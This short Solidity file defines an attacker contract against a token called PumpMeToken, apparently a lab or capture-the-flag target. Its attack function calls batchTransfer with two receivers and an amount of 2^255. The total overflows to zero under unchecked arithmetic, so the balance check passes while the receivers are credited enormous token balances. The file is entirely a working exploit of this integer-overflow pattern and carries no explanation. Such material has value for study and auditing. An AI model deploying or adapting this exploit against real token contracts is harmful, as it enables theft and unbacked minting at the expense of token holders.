// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import {PumpMeToken} from "./PumpMeToken.sol";

contract PumpAttacker {
    PumpMeToken public token;
    address public owner;
    address[] public receivers = new address[](2);

    constructor(address _token, address _owner) {
        token = PumpMeToken(_token);
        owner = _owner;
        receivers[0] = owner;
    }

    function attack() external payable {
        token.batchTransfer(receivers, 57896044618658097711785492504343953926634992332820282019728792003956564819968);
    }
}
